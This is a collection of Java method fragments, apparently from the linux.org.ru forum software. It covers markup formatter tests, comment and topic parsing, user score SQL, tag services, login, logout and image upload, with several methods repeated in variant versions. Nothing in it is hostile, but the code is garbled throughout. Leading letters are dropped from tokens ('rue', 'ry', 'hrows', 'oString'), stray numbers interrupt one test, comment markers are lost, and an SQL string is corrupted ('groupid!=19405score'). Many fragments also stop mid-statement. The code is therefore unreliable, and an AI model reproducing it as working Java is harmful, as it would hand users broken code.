public void listTest4 ( ) { String a = " [list] n[*]one ncrap n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br]crap[br][*]two[br][*]three[br][/list] " , oLorCodeFormatter . format ( a ) ) ; assertEquals ( " [list] n[*]one ncrap n[*]two n[*]three n[/list] " , oLorCodeTexFormatter . format ( a ) ) ; toLorCodeFormatter.format(a) String b = toLorCodeFormatter.format(a); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, true, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, true, false) ); toLorCodeTexFormatter.format(a) b = toLorCodeTexFormatter.format(a); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, true, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", 
public void estToLorCodeTexFormatter ( ) { assertEquals ( RESULT_QUOTING1 , oLorCodeTexFormatter . format ( QUOTING1 ) ) ; assertEquals ( RESULT_QUOTING2 , oLorCodeTexFormatter . format ( QUOTING2 ) ) ; assertEquals ( RESULT_QUOTING3 , oLorCodeTexFormatter . format ( QUOTING3 ) ) ; assertEquals ( " [quote]test[br][/quote]test " , oLorCodeTexFormatter . format ( " >test ntest " ) ) ; 4 assertEquals("testtesttest", toLorCodeTexFormatter.format("testtesttest")); 1 assertEquals("test[quote]test[/quote]", toLorCodeTexFormatter.format("test>test")); 7 assertEquals("test &", toLorCodeTexFormatter.format("test &")); 8 assertEquals("test[br]test", toLorCodeFormatter.format("test\rtest")); 9 assertEquals("test[br]test", toLorCodeFormatter.format("testtest")); 10 assertEquals("[quote]test[br][/quote]test", toLorCodeFormatter.format(">testtest")); 11 assertEquals("[quote]test[br]test[/quote]", toLorCodeFormatter.format(">test>test")); 12 } 
public void codeEscapeBasic ( ) { assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] " ) ) ; assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] " ) ) ; assertEquals ( " [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [/code] " ) ) ; assertEquals ( " [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [/code] " ) ) ; assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [[code]] " ) ) ; assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [[code]] " ) ) ; assertEquals ( " [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [[/code]] " ) ) ; assertEquals ( " ][[code]] " , ToLorCodeTexFormatter . escapeCode ( " ][code] " ) ) ; assertEquals ( " [[code]] [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] [code] " ) ) ; assertEquals ( " [[code]] [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] [/code] " ) ) ; } 
public void codeEscape ( ) { assertEquals ( " [code][/code] " , oLorCodeTexFormatter . format ( " [code][/code] " ) ) ; assertEquals ( " [code=perl][/code] " , oLorCodeTexFormatter . format ( " [code=perl][/code] " ) ) ; } 
public void againQuoteFormatter ( ) { assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , oLorCodeFormatter . format ( " >one n>>two n>one n>>>three " ) ) ; assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , oLorCodeTexFormatter . format ( " >one n>>two n>one n>>>three " ) ) ; 
public String parseComment ( String ext , boolean secure , boolean nofollow ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( secure , false , nofollow ) , ext ) . renderXHtml ( ) ; } 
String parseCommentRSS ( String ext , boolean secure ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( secure , rue , false ) , ext ) . renderXHtml ( ) ; } 
public String extractPlainTextFromLorcode ( String ext ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( false , rue , false ) , ext ) . renderOg ( ) ; } 
public String parseTopicWithMinimizedCut ( String ext , String cutURL , boolean secure , boolean nofollow ) { return DEFAULT_PARSER . parseRoot ( prepareTopicRootNode ( rue , cutURL , secure , nofollow ) , ext ) . renderXHtml ( ) ; } 
public String parseTopic ( String ext , boolean secure , boolean nofollow ) { return DEFAULT_PARSER . parseRoot ( prepareTopicRootNode ( false , null , secure , nofollow ) , ext ) . renderXHtml ( ) ; } 
private RootNode prepareCommentRootNode ( boolean secure , boolean rss , boolean nofollow ) { RootNode rootNode = DEFAULT_PARSER . createRootNode ( ) ; rootNode . setCommentCutOptions ( ) ; rootNode . setUserService ( userService ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( oHtmlFormatter ) ; rootNode . setRss ( rss ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean secure , boolean nofollow ) { RootNode rootNode = DEFAULT_PARSER . createRootNode ( ) ; if ( minimizeCut ) { ry { LorURL lorCutURL = new LorURL ( siteConfig . getMainURI ( ) , cutURL ) ; if ( lorCutURL . isTrueLorUrl ( ) ) { URI fixURI = new URI ( lorCutURL . fixScheme ( secure ) , rue , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } else { rootNode . setMaximizedTopicCutOptions ( ) ; } } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserService ( userService ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( oHtmlFormatter ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
public RootNode createRootNode ( ) { return new RootNode ( parserParameters ) ; } 
private String parse ( String ext ) { return DEFAULT_PARSER . parseRoot ( DEFAULT_PARSER . createRootNode ( ) , ext ) . renderXHtml ( ) ; } 
public void codeTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , parse ( " [code][list][*]one[*]two[*]three[/list][/code] " ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>simple code</code></pre></div> " , parse ( " [code] nsimple code[/code] " ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , 
public void codeSpacesTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[url]test[/url] [url]test[/url]</code></pre></div> " , 
public void codeCleanTest ( ) { assertEquals ( " " , parse ( " [code][/code] " ) ) ; } 
public void codeKnowTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , parse ( " [code=cxx]#include <stdio.h>[/code] " ) ) ; 
public void codeUnKnowTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , parse ( " [code=foo]#include <stdio.h>[/code] " ) ) ; 
protected void renderMergedOutputModel ( Map model , HttpServletRequest request , HttpServletResponse response ) hrows Exception { SyndFeed feed = new SyndFeedImpl ( ) ; feed . setEncoding ( " utf-8 " ) ; String feedType = ( String ) model . get ( " feed-type " ) ; if ( Strings . isNullOrEmpty ( feedType ) ) { feedType = " rss " ; } feed . setFeedType ( feedTypes . get ( feedType ) ) ; createFeed ( feed , model ) ; response . setContentType ( contentTypes . get ( feedType ) ) ; response . setCharacterEncoding ( " UTF-8 " ) ; SyndFeedOutput output = new SyndFeedOutput ( ) ; output . output ( feed , response . getWriter ( ) ) ; } 
public String encode ( CharSequence rawPassword ) { return encryptor . encryptPassword ( rawPassword . oString ( ) ) ; } 
public boolean matches ( CharSequence rawPassword , String encodedPassword ) { return encryptor . checkPassword ( rawPassword . oString ( ) , encodedPassword ) ; } 
public boolean isCommentEditableNow ( @Nonnull Comment comment , @Nullable User currentUser , boolean haveAnswers , @Nonnull Topic opic ) { Errors errors = new MapBindingResult ( ImmutableMap . of ( ) , " obj " ) ; checkCommentsAllowed ( opic , currentUser , errors ) ; checkCommentEditableNow ( comment , currentUser , haveAnswers , opic , errors ) ; return ! errors . hasErrors ( ) ; } 
public String format ( String ext , boolean secure , boolean nofollow , RuTypoChanger changer ) { String escapedText = StringUtil . escapeHtml ( ext ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String oken = st . nextToken ( ) ; String formattedToken = formatURL ( oken , secure , nofollow , changer ) ; sb . append ( formattedToken ) ; } return sb . oString ( ) . replaceAll ( MDASH_REGEX , MDASH_REPLACE ) ; } 
public void encodeLorUrl ( ) { assertEquals ( " <p><a href= \" http:www.linux.org.ru/forum/linux%3C%3E-org-ru/ \" >www.linux.org.ru/forum/linux&lt;&gt;-org-ru/</a></p> " , 
public void updateScore ( ) { logger . info ( " Updating score " ) ; jdbcTemplate . update ( " update users set score=score+1 " + " where id in " + " (select distinct comments.userid from comments, topics " + " where comments.postdate>CURRENT_TIMESTAMP-'2 days'::interval " + " and topics.id=comments.topic and " + " groupid!=8404 and groupid!=4068 and groupid!=19390 and groupid!=19405score and " + " not comments.deleted and not topics.deleted) " ) ; updateMaxScore ( ) ; } 
public void updateScore ( ) { logger . info ( " Updating score " ) ; jdbcTemplate . update ( " update users set score=score+1 " + " where id in " + " (select distinct comments.userid from comments, topics " + " where comments.postdate>CURRENT_TIMESTAMP-'2 days'::interval " + " and topics.id=comments.topic and " + " groupid!=8404 and groupid!=4068 and groupid!=19390 and groupid!=19405 and " + " not comments.deleted and not topics.deleted) " ) ; updateMaxScore ( ) ; } 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } return ! canmod ; } 
public List < Image > imageByFile ( String path ) { return jdbcTemplate . query ( " SELECT id, topic, original, icon FROM images WHERE original=? " , 
public String handle403 ( ) { return " errors/code403 " ; } 
protected ModelAndView getData ( HttpServletRequest request ) hrows Exception { ModelAndView mav = new ModelAndView ( ) ; mav . setViewName ( " boxlets/gallery " ) ; List < PreparedGalleryItem > list = imageService . prepare ( imageService . getGalleryItems ( COUNT_ITEMS ) ) ; mav . addObject ( " items " , list ) ; return mav ; } 
protected ModelAndView getData ( HttpServletRequest request ) hrows Exception { ModelAndView mav = new ModelAndView ( ) ; mav . setViewName ( " boxlets/gallery " ) ; List < PreparedGalleryItem > list = imageService . prepareGalleryItem ( imageService . getGalleryItems ( COUNT_ITEMS ) ) ; mav . addObject ( " items " , list ) ; return mav ; } 
public Screenshot moveTo ( File dir , String name ) hrows IOException { Screenshot dest = new Screenshot ( name , dir , extension ) ; Files . move ( mainFile . oPath ( ) , dest . mainFile . oPath ( ) ) ; Files . move ( iconFile . oPath ( ) , dest . iconFile . oPath ( ) ) ; Files . move ( mediumFile . oPath ( ) , dest . mediumFile . oPath ( ) ) ; Files . move ( medium2xFile . oPath ( ) , dest . medium2xFile . oPath ( ) ) ; return dest ; } 
void doResize ( File uploadedFile ) hrows IOException , BadImageException { Files . move ( uploadedFile . oPath ( ) , mainFile . oPath ( ) , StandardCopyOption . REPLACE_EXISTING ) ; boolean error = rue ; ry { ImageUtil . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
private File processUploadImage ( HttpServletRequest request ) hrows IOException , ScriptErrorException { if ( request instanceof MultipartHttpServletRequest ) { MultipartFile multipartFile = ( ( MultipartRequest ) request ) . getFile ( " image " ) ; if ( multipartFile ! = null & & ! multipartFile . isEmpty ( ) ) { File uploadedFile = File . createTempFile ( " lor-image- " , " " ) ; logger . debug ( " Transfering upload to: " + uploadedFile ) ; multipartFile . ransferTo ( uploadedFile ) ; return uploadedFile ; } } return null ; } 
public ElasticClient elasticsearch ( ) { Client mockClient = Mockito . mock ( Client . class ) ; Mockito . when ( mockClient . prepareSearch ( Matchers . anyString ( ) ) ) . henThrow ( new ElasticsearchException ( " no ES here " ) ) ; return ElasticClient . fromClient ( mockClient ) ; } 
public void prefixSearchExactTest ( ) { agDao . createTag ( " zest " ) ; agDao . createTag ( " zesd " ) ; scala . collection . Seq < TagInfo > ags = agDao . getTagsByPrefix ( " zest " , 0 ) ; assertEquals ( 1 , ags . size ( ) ) ; } 
public void prefixSearchSimpleTest ( ) { int zest = agDao . createTag ( " zest " ) ; int zesd = agDao . createTag ( " zesd " ) ; scala . collection . Seq < TagInfo > ags = agDao . getTagsByPrefix ( " ze " , 0 ) ; assertEquals ( 2 , ags . size ( ) ) ; assertEquals ( zesd , ags . apply ( 0 ) . id ( ) ) ; assertEquals ( zest , ags . apply ( 1 ) . id ( ) ) ; } 
public void estRelatedTags ( ) { scala . collection . Seq < String > ags = agDao . relatedTags ( 30 ) ; assertNotNull ( ags ) ; } 
private ModelAndView mainTopicsFeedHandler ( Section section , HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response , @Nullable Group group ) hrows Exception { checkRequestConditions ( section , group , opicListForm ) ; Template mpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-news " ) ; modelAndView . addObject ( " group " , group ) ; modelAndView . addObject ( " url " , " view-news.jsp " ) ; modelAndView . addObject ( " section " , section ) ; modelAndView . addObject ( " archiveLink " , section . getArchiveLink ( ) ) ; setExpireHeaders ( response , opicListForm . getYear ( ) , opicListForm . getMonth ( ) ) ; modelAndView . addObject ( " navtitle " , calculateNavTitle ( section , group , opicListForm ) ) ; opicListForm . setOffset ( opicListService . fixOffset ( opicListForm . getOffset ( ) ) ) ; List < Topic > messages = opicListService . getTopicsFeed ( section , group , null , opicListForm . getOffset ( ) , opicListForm . getYear ( ) , opicListForm . getMonth ( ) , 20 ) ; modelAndView . addObject ( " messages " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ) ; modelAndView . addObject ( " offsetNavigation " , opicListForm . getMonth ( ) = = null ) ; return modelAndView ; } 
public ModelAndView gallery ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSection ( Section . SECTION_GALLERY ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( section , request , opicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( section , opicListForm ) ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " rssLink " , " section-rss.jsp?section=3 " ) ; return modelAndView ; } 
public ModelAndView forum ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSection ( Section . SECTION_FORUM ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( section , request , opicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( section , opicListForm ) ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; modelAndView . addObject ( " rssLink " , " section-rss.jsp?section=2 " ) ; return modelAndView ; } 
public ModelAndView polls ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSection ( Section . SECTION_POLLS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( section , request , opicListForm , response , null ) ; modelAndView . addObject ( " url " , " /polls/ " ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( section , opicListForm ) ) ; return modelAndView ; } 
public ModelAndView news ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSection ( Section . SECTION_NEWS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( section , request , opicListForm , response , null ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( section , opicListForm ) ) ; modelAndView . addObject ( " rssLink " , " section-rss.jsp?section=1 " ) ; return modelAndView ; } 
public ModelAndView galleryGroup ( HttpServletRequest request , TopicListRequest opicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSection ( Section . SECTION_GALLERY ) ; return group ( section , request , opicListForm , groupName , response ) ; } 
public ModelAndView newsGroup ( HttpServletRequest request , TopicListRequest opicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSection ( Section . SECTION_NEWS ) ; return group ( section , request , opicListForm , groupName , response ) ; } 
public ModelAndView pollsGroup ( HttpServletRequest request , TopicListRequest opicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSection ( Section . SECTION_POLLS ) ; return group ( section , request , opicListForm , groupName , response ) ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) hrows Exception { TopicListRequest opicListForm = new TopicListRequest ( ) ; Section sectionObject = sectionService . getSectionByName ( section ) ; if ( sectionObject . isPremoderated ( ) ) { opicListForm . setYear ( year ) ; 
private ModelAndView group ( Section section , HttpServletRequest request , TopicListRequest opicListForm , String groupName , HttpServletResponse response ) hrows Exception { Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( section , request , opicListForm , response , group ) ; modelAndView . addObject ( " ptitle " , section . getName ( ) + " - " + group . getTitle ( ) ) ; modelAndView . addObject ( " url " , group . getUrl ( ) ) ; return modelAndView ; } 
public ModelAndView opics ( HttpServletRequest request , @PathVariable ( " section " ) String sectionName , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSectionByName ( sectionName ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( section , request , opicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( section , opicListForm ) ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " rssLink " , " section-rss.jsp?section=3 " ) ; return modelAndView ; } 
public ModelAndView opicsByGroup ( @PathVariable ( " section " ) String sectionName , HttpServletRequest request , TopicListRequest opicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSectionByName ( sectionName ) ; return group ( section , request , opicListForm , groupName , response ) ; } 
public boolean hasSimilarUsers ( String nick ) { int c = jdbcTemplate . queryForObject ( " SELECT count(*) FROM users WHERE " + " NOT blocked AND score>100 AND lastlogin<CURRENT_TIMESTAMP-'3 years'::INTERVAL " + " AND levenshtein_less_equal(lower(nick), ?, 1)<=1 " , Integer . class , nick ) ; return c > 0 ; } 
public boolean hasSimilarUsers ( String nick ) { int c = jdbcTemplate . queryForObject ( " SELECT count(*) FROM users WHERE " + " NOT blocked AND score>=200 AND lastlogin>CURRENT_TIMESTAMP-'3 years'::INTERVAL " + " AND levenshtein_less_equal(lower(nick), ?, 1)<=1 " , Integer . class , nick ) ; return c > 0 ; } 
public boolean hasSimilarUsers ( String nick ) { int c = jdbcTemplate . queryForObject ( " SELECT count(*) FROM users WHERE " + " NOT blocked AND score>=200 AND lastlogin>CURRENT_TIMESTAMP-'3 years'::INTERVAL " + " AND levenshtein_less_equal(lower(nick), ?, 1)<=1 " , Integer . class , nick . oLowerCase ( ) ) ; return c > 0 ; } 
public ModelAndView loginProcess ( @RequestParam ( " nick " ) final String username , @RequestParam ( " passwd " ) final String password , HttpServletRequest request , HttpServletResponse response ) hrows Exception { UsernamePasswordAuthenticationToken oken = new UsernamePasswordAuthenticationToken ( username , password ) ; ry { UserDetailsImpl details = ( UserDetailsImpl ) userDetailsService . loadUserByUsername ( username ) ; 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoreTagName " , required = false ) String newIgnoreTagName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarks ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , rue ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoreTagName ! = null & & TagName . isGoodTag ( newIgnoreTagName ) ) { modelAndView . addObject ( " newIgnoreTagName " , newIgnoreTagName ) ; } return modelAndView ; } 
public int countIgnore ( int agId ) { return jdbcTemplate . queryForObject ( " SELECT count(*) FROM user_tags WHERE tag_id=:tagId AND NOT is_favorite " , 
public int ignoreAdd ( User user , String agName ) hrows TagNotFoundException { int agId = agService . getTagId ( agName ) ; userTagDao . addTag ( user . getId ( ) , agService . getTagId ( agName ) , false ) ; return agId ; } 
public int ignoreDel ( User user , String agName ) hrows TagNotFoundException { int agId = agService . getTagId ( agName ) ; userTagDao . deleteTag ( user . getId ( ) , agService . getTagId ( agName ) , false ) ; return agId ; } 
public int countIgnore ( int id ) { return userTagDao . countIgnore ( id ) ; } 
public void updateUser ( @Nonnull User user , String name , String url , @Nullable String newEmail , String own , @Nullable String password , String info ) { jdbcTemplate . update ( " UPDATE users SET name=?, url=?, town=? WHERE id=? " , name , url , own , user . getId ( ) ) ; if ( newEmail ! = null ) { jdbcTemplate . update ( " UPDATE users SET new_email=? WHERE id=? " , newEmail , user . getId ( ) ) ; } if ( password ! = null ) { setPassword ( user , password ) ; userLogDao . logSetPassword ( user ) ; } setUserInfo ( user . getId ( ) , info ) ; } 
public void updateMessage ( final int msgid , final boolean withComments ) { logger . info ( " Scheduling reindex # " + msgid + " withComments= " + withComments ) ; jmsTemplate . send ( queue , session - > { return session . createObjectMessage ( new UpdateMessage ( msgid , withComments ) ) ; 
public void updateMonth ( final int year , final int month ) { logger . info ( " Scheduling reindex by date " + year + '/' + month ) ; jmsTemplate . send ( queue , session - > { return session . createObjectMessage ( new UpdateMonth ( year , month ) ) ; 
public void updateComment ( final int msgid ) { Preconditions . checkArgument ( msgid ! = 0 , " msgid==0!? " ) ; jmsTemplate . send ( queue , session - > { return session . createObjectMessage ( new UpdateComments ( Collections . singletonList ( msgid ) ) ) ; 
public void updateComment ( final List < Integer > msgids ) { jmsTemplate . send ( queue , session - > { return session . createObjectMessage ( new UpdateComments ( msgids ) ) ; 
public ModelAndView logout ( HttpServletRequest request , HttpServletResponse response ) { Authentication auth = SecurityContextHolder . getContext ( ) . getAuthentication ( ) ; if ( auth ! = null ) { new SecurityContextLogoutHandler ( ) . logout ( request , response , auth ) ; } Cookie cookie = new Cookie ( " remember_me " , null ) ; cookie . setMaxAge ( 0 ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; return new ModelAndView ( new RedirectView ( " /login.jsp " ) ) ; } 
public ModelAndView logoutLink ( ) { if ( AuthUtil . isSessionAuthorized ( ) ) { return new ModelAndView ( new RedirectView ( " /people/ " + AuthUtil . getNick ( ) + " /profile " ) ) ; 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( HOVER_PROPERTY , Boolean . TRUE ) ; builder . put ( STYLE_PROPERTY , " ango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " quot " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , rue ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , rue ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "poll", "top10", "gallery", "tagcloud", "archive" ); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( HOVER_PROPERTY , Boolean . TRUE ) ; builder . put ( STYLE_PROPERTY , " ango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " quot " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , rue ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , rue ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "poll", "top10", "gallery", "tagcloud", "archive" ); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public void updateMessage ( final int msgid , final boolean withComments ) { logger . info ( " Scheduling reindex # " + msgid + " withComments= " + withComments ) ; jmsTemplate . send ( queue , session - > session . createObjectMessage ( new UpdateMessage ( msgid , withComments ) ) ) ; } 
public void updateMonth ( final int year , final int month ) { logger . info ( " Scheduling reindex by date " + year + '/' + month ) ; jmsTemplate . send ( queue , session - > session . createObjectMessage ( new UpdateMonth ( year , month ) ) ) ; } 
public void updateComment ( final int msgid ) { Preconditions . checkArgument ( msgid ! = 0 , " msgid==0!? " ) ; jmsTemplate . send ( queue , session - > session . createObjectMessage ( new UpdateComments ( Collections . singletonList ( msgid ) ) ) ) ; } 
public void updateComment ( final List < Integer > msgids ) { jmsTemplate . send ( queue , session - > session . createObjectMessage ( new UpdateComments ( msgids ) ) ) ; } 
public void favoritesGetTest ( ) { ImmutableList . Builder < String > etalonBuild = ImmutableList . builder ( ) ; etalonBuild . add ( " ag1 " ) ; ImmutableList < String > etalon = etalonBuild . build ( ) ; when ( userTagDao . getTags ( 1 , rue ) ) . henReturn ( etalon ) ; List < String > actual = userTagService . favoritesGet ( user ) ; Assert . assertEquals ( etalon . size ( ) , actual . size ( ) ) ; Assert . assertEquals ( etalon . get ( 0 ) , actual . get ( 0 ) ) ; } 
public void ignoresGetTest ( ) { ImmutableList . Builder < String > etalonBuild = ImmutableList . builder ( ) ; etalonBuild . add ( " ag1 " ) ; ImmutableList < String > etalon = etalonBuild . build ( ) ; when ( userTagDao . getTags ( 1 , false ) ) . henReturn ( etalon ) ; List < String > actual = userTagService . ignoresGet ( user ) ; Assert . assertEquals ( etalon . size ( ) , actual . size ( ) ) ; Assert . assertEquals ( etalon . get ( 0 ) , actual . get ( 0 ) ) ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " erm " ) final String erm ) { Collection < String > ags = agService . suggestTagsByPrefix ( erm , 10 ) ; return ImmutableList . copyOf ( Iterables . filter ( ags , Tag 
public MoreLikeThisService moreLikeThisService ( ) { return mock ( MoreLikeThisService . class ) ; } 
public ElasticClient elasticsearch ( ) { Client mockClient = mock ( Client . class ) ; Mockito . when ( mockClient . prepareSearch ( Matchers . anyString ( ) ) ) . henThrow ( new ElasticsearchException ( " no ES here " ) ) ; return ElasticClient . fromClient ( mockClient ) ; } 
public SearchQueueSender searchQueueSender ( ) { return mock ( SearchQueueSender . class ) ; } 
public ElasticClient elasticsearch ( ) { Client mockClient = mock ( Client . class ) ; Mockito . when ( mockClient . prepareSearch ( Matchers . anyString ( ) ) ) . henThrow ( new ElasticsearchException ( " no ES here " ) ) ; return ElasticClient$ . MODULE$ . fromClient ( mockClient ) ; } 
